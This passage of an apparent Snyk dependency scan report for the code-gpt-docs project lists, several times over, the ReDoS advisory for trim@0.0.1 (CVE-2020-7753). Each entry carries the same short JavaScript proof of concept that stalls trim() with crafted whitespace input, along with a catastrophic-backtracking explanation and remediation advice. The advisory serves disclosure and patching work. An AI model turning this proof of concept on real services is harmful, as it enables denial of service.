      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The 